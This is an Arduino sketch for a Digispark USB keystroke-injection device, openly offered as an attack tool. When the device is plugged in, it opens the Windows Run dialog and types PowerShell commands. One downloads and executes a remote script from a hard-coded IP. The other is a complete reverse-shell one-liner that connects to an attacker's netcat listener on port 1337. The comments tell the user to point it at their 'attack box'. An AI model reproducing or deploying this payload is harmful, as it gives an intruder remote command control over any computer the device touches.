// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
// Credits to hak5 and @samratashok for the powershell oneliner https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.

// start your netcat listener on port 1337 and change the IP address to your attack box

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://10.2.172.68/kali/home/Downloads/Invoke-PowerShellTcpOneLine.ps1');\"");
  
  //change the IP address and the port number to the desired IP and port on the next line
  DigiKeyboard.print("$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}